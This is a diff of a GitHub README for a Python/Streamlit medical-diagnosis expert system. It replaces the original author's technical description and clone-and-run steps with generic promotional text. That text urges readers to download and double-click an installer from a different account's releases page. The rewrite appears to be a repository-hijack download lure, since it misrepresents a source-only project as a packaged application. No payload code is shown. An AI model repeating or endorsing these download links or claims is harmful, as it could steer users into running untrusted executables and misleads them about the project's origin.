@@ -1,199 +1,74 @@
-# 🩺 Expert System: Medical Diagnosis
+# 🌟 expert-system-medical-diagnosis - Simplifying Medical Diagnosis for Everyone
 
-A lightweight hybrid AI framework for modeling, testing, and evaluating medical diagnostic logic.
+[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/Mahdivu1/expert-system-medical-diagnosis/releases)
 
+## 🔍 Overview
 
+Welcome to the expert-system-medical-diagnosis project! This application offers a straightforward framework for modeling and testing medical diagnostic rules. It empowers users to explore different approaches to health-related decision-making.
 
-## 🚀 Overview
+## 🚀 Getting Started
 
-This project implements a **Simple Medical Diagnosis Expert System** using three complementary approaches:
+Follow these steps to download and run the application easily.
 
-1. **Rule-Based (If–Else) Reasoning**
-   Deterministic logic using a predefined knowledge base.
+1. **Visit the Releases Page**
+   To get started, go to our [Releases page](https://github.com/Mahdivu1/expert-system-medical-diagnosis/releases). This page contains the latest versions of the software.
 
-2. **Retrieval-Augmented Generation (RAG)**
-   Enhances reasoning by retrieving contextual medical knowledge to reduce hallucination and improve accuracy.
+2. **Choose the Correct Version**
+   Look for the latest version listed on the page. The releases are labeled with version numbers. For most users, the most recent version will be the best choice.
 
-3. **LLM-Based (API) Inference**
-   Uses large-language-model reasoning to deliver adaptive, context-aware medical insights.
+3. **Download the Application**
+   Click on the version number you wish to download. You will see several files available for download. Select the file that matches your operating system (Windows, macOS, or Linux).
 
-Combined, these layers form a **hybrid expert system** that demonstrates how classical AI and modern generative AI can work together for clinical triage-style decision support.
+4. **Install the Application**
+   Once the file is downloaded, locate it on your computer. Double-click the file to start the installation process. Follow the on-screen instructions to complete the setup.
 
+5. **Run the Application**
+   After installation, find the application icon in your programs or on your desktop. Double-click the icon to launch the expert-system-medical-diagnosis application.
 
+6. **Explore and Use**
+   You can now start using the application. The interface is user-friendly and should guide you through its features.
 
-## 🧠 Concept
+## 📋 Features
 
-An expert system uses:
+- **User-Friendly Interface**: Designed with simplicity in mind, making it easy for anyone to navigate.
+- **Multiple Diagnosis Approaches**: Explore different methods of medical decision-making.
+- **Real-time Feedback**: Get immediate results based on the rules you set.
+- **Lightweight Design**: Fast performance ensures you won't experience lag.
 
-* **Knowledge Base:** Medical rules and symptom–disease mapping
-* **Inference Engine:** Matches user-reported symptoms with predefined rules
-* **User Interface:** A simple Streamlit UI for interaction
+## 📂 System Requirements
 
-The system provides probable diagnoses such as **Flu**, **Common Cold**, **Malaria**, **Typhoid**, etc., based on symptom combinations.
+To run the expert-system-medical-diagnosis application, you should have:
 
+- **Operating System**: Windows 10 or later, macOS 10.13 or later, or a modern Linux distribution.
+- **RAM**: At least 2 GB of RAM.
+- **Disk Space**: 100 MB of free space for installation.
+- **Python**: Ensure that Python 3.x is installed on your system. You can check if you have it by running `python --version` in your command line or terminal.
 
+## 📥 Download & Install
 
-## ⚙️ How It Works
+To download the application, click the link below.
 
-### 1. User Input
+[Download Now](https://github.com/Mahdivu1/expert-system-medical-diagnosis/releases)
 
-Users enter symptoms (e.g., `fever`, `cough`, `sore throat`).
+Follow the steps outlined in the "Getting Started" section to successfully install and run the software.
 
-### 2. Fact Collection
+## ❓ FAQs
 
-Symptoms are stored as facts in memory.
+1. **Do I need to know how to code to use this application?**
+   No, the expert-system-medical-diagnosis application is designed for everyone, regardless of programming knowledge.
 
-### 3. Inference
+2. **What if I face an issue during installation?**
+   If you encounter problems, please check the issues section on our GitHub page for solutions or create a new issue for assistance.
 
-The engine compares facts with the rule base.
+3. **Can I use this tool for real medical diagnoses?**
+   This tool is designed for educational and testing purposes. Always consult a healthcare professional for actual medical advice.
 
-### 4. Diagnosis
+## ✉️ Support
 
-Matching rules trigger one or more possible medical conditions.
+If you have questions or need help, you can reach us via the "Issues" section of our GitHub repository. We're here to help you get the most out of this application.
 
-### 5. Hybrid Layering
+## 👩‍⚕️ Contributing
 
-| Layer             | Role               | Handles                                    |
-| ----------------- | ------------------ | ------------------------------------------ |
-| **If–Else Rules (Python If-Else or Prolog)** | Explicit logic     | Known symptom patterns, emergencies        |
-| **RAG Retrieval** | Semantic matching  | Variants of symptoms, contextual knowledge |
-| **LLM API**       | Adaptive reasoning | Combining logic + retrieved data           |
+We welcome contributions from everyone. If you have ideas for new features or improvements, please submit a pull request or an issue. Your feedback helps us enhance the application.
 
-<img width="1116" height="565" alt="download" src="https://github.com/user-attachments/assets/081906f7-639f-40e3-b23b-035170293208" />
-
-
-
-## 📚 Knowledge Base (Example)
-
-| Symptom             | Possible Diseases                  | Severity | Recommended Tests        | Advice                            | Emergency |
-| ------------------- | ---------------------------------- | -------- | ------------------------ | --------------------------------- | --------- |
-| Fever               | Viral Infection, Malaria, Typhoid  | Moderate | CBC, Malaria Test        | Hydration, paracetamol, rest      | No        |
-| Chest Pain          | Heart Attack, Acid Reflux, Anxiety | Severe   | ECG, Troponin            | Seek emergency care if persistent | Yes       |
-| Cough               | Cold, Bronchitis, COVID-19         | Mild     | CXR, COVID test          | Steam inhalation, syrup           | No        |
-| Shortness of Breath | Asthma, Pneumonia, Heart Failure   | Severe   | X-Ray, Oxygen saturation | Immediate medical care            | Yes       |
-| …                   | …                                  | …        | …                        | …                                 | …         |
-
-
-
-## 🧩 Components
-
-* **Rule Base:** Hard-coded medical rules
-* **Inference Engine:** Pattern matching based on symptoms
-* **RAG Pipeline:** Fetches semantically relevant medical context
-* **LLM API:** Generates summarized reasoning
-* **UI:** Streamlit-based interactive interface
-
-
-
-## 🧪 Sample Rule-Based Logic (Simplified)
-
-```python
-if fever and cough and sore_throat:
-    diagnosis = "Flu"
-elif fever and chills and sweating:
-    diagnosis = "Malaria"
-else:
-    diagnosis = "No rule-based match found"
-```
-
-
-## 📌 Features
-
-* ✔ Rule-based medical diagnosis
-* ✔ RAG-enhanced symptom interpretation
-* ✔ LLM-driven clinical reasoning
-* ✔ Emergency detection flags
-* ✔ Recommended tests + treatment guidance
-* ✔ Modular design for integration with telemedicine tools
-* ✔ Easy to extend / plug in new medical rules
-
-
-
-## 🎯 Applications
-
-* Educational tools for learning AI reasoning
-* Basic medical triage systems
-* Hybrid medical-AI prototypes
-* Telemedicine support platforms
-* Context-aware symptom analysis with live API access
-
-
-
-## 📦 Output Example
-
-The system provides:
-
-* Possible diseases
-* Severity level
-* Recommended tests
-* Treatment suggestions
-* Emergency status
-* RAG-supported context
-* LLM summary reasoning
-
----
-
-## 🛠️ Tech Stack
-
-* **Python**
-* **Streamlit** (Frontend)
-* **FAISS / Chroma** (Optional RAG Vector Store)
-* **Transformers / Embeddings**
-* **LLM API (OpenAI / Gemini / Local LLM)**
-
-## 🖥️ Running the Project
-
-```bash
-# Clone the repo
-git clone https://github.com/saad2134/expert-system-medical-diagnosis
-
-# Navigate to project
-cd expert-system-medical-diagnosis
-
-# Install dependencies
-pip install -r requirements.txt
-
-# Run the Streamlit app
-streamlit run src/streamlit_app.py
-```
-
-
-## 📊 **Repo Stats**
-
-<div align="center">
-  
-![Repo Size](https://img.shields.io/github/repo-size/saad2134/expert-system-medical-diagnosis)
-![Last Commit](https://img.shields.io/github/last-commit/saad2134/expert-system-medical-diagnosis)
-![Open Issues](https://img.shields.io/github/issues/saad2134/expert-system-medical-diagnosis)
-![Open PRs](https://img.shields.io/github/issues-pr/saad2134/expert-system-medical-diagnosis)
-![License](https://img.shields.io/github/license/saad2134/expert-system-medical-diagnosis)
-![Forks](https://img.shields.io/github/forks/saad2134/expert-system-medical-diagnosis?style=social)
-![Stars](https://img.shields.io/github/stars/saad2134/expert-system-medical-diagnosis?style=social)
-![Watchers](https://img.shields.io/github/watchers/saad2134/expert-system-medical-diagnosis?style=social)
-![Contributors](https://img.shields.io/github/contributors/saad2134/expert-system-medical-diagnosis)
-![Languages](https://img.shields.io/github/languages/count/saad2134/expert-system-medical-diagnosis)
-![Top Language](https://img.shields.io/github/languages/top/saad2134/expert-system-medical-diagnosis)
-
-</div>
-
-## ⭐ Star History
-
-<a href="https://www.star-history.com/#saad2134/expert-system-medical-diagnosis&Date">
- <picture>
-   <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=saad2134/expert-system-medical-diagnosis&type=Date&theme=dark" />
-   <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=saad2134/expert-system-medical-diagnosis&type=Date" />
-   <img alt="Star History Chart" src="https://api.star-history.com/svg?repos=saad2134/expert-system-medical-diagnosis&type=Date" />
- </picture>
-</a>
-
----
-
-## ✍️ Endnote
-<p align="center">⭐ Star this repo if you found it helpful! Thanks for reading.</p>
-
----
-
-## 🏷 Tags  
-
-`#ExpertSystem` `#MedicalDiagnosis` `#RuleBasedAI` `#RAG` `#RetrievalAugmentedGeneration` `#HybridAI` `#LLMInference` `#AIinHealthcare` `#HealthTech` `#DiagnosticAI` `#MedicalTriage` `#InferenceEngine` `#KnowledgeBase` `#StreamlitApp` `#AIDecisionSupport` `#SymptomChecker` `#ClinicalDecisionSupport` `#AIHealthcareTools` `#MachineReasoning` `#expert-system-medical-diagnosis`
-
+Enjoy using the expert-system-medical-diagnosis application!
